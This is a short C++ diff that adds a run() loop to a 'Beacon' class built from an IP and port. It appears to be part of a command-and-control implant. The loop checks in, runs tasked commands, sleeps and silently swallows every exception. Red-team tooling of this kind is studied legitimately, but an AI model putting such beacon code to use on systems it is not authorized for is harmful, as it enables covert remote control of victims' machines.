@@ -23,6 +23,35 @@ public:
 	Beacon(const std::string& ip, int port);
 	virtual ~Beacon(){};
 
+	void run()
+	{
+		bool exit = false;
+		while (!exit)
+		{
+			try 
+			{
+				checkIn();
+
+				exit = runTasks();
+				
+				sleep();
+			}
+			catch(const std::exception& ex)
+			{
+				// std::cout << "Exeption " << std::endl;
+				// std::cout << "Exeption " << ex.what() << std::endl;
+				sleep();
+			}
+			catch (...) 
+			{
+				// std::cout << "Exeption" << std::endl;
+				sleep();
+			}
+		}
+
+		checkIn();
+	}
+
 	virtual void  checkIn() = 0;
 	bool runTasks();
 	void sleep();
